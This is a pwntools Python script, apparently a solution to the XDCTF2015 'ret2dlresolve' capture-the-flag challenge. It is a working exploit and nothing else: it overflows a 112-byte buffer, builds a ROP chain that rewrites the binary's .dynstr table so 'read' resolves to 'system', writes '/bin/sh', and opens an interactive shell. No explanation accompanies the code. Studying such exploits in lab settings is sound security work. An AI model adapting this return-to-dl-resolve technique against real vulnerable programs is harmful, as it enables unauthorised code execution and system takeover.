from pwn import *
p = process("./ret2dlresolve")
rop = ROP("./ret2dlresolve")
elf = ELF("./ret2dlresolve")

p.recvuntil('Welcome to XDCTF2015~!\n')

offset = 112
rop.raw(offset*'A')
rop.read(0,0x08049808,4)
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.read(0,0x080498E0,len((dynstr)))
rop.read(0,0x080498E0+0x100,len("/bin/sh\x00"))
rop.raw(0x08048376)
rop.raw(0xdeadbeef)
rop.raw(0x080498E0+0x100)
rop.raw("a"*(256-len(rop.chain())))

p.send(rop.chain())
p.send(p32(0x080498E0))
p.send(dynstr)
p.send("/bin/sh\x00")
p.interactive()
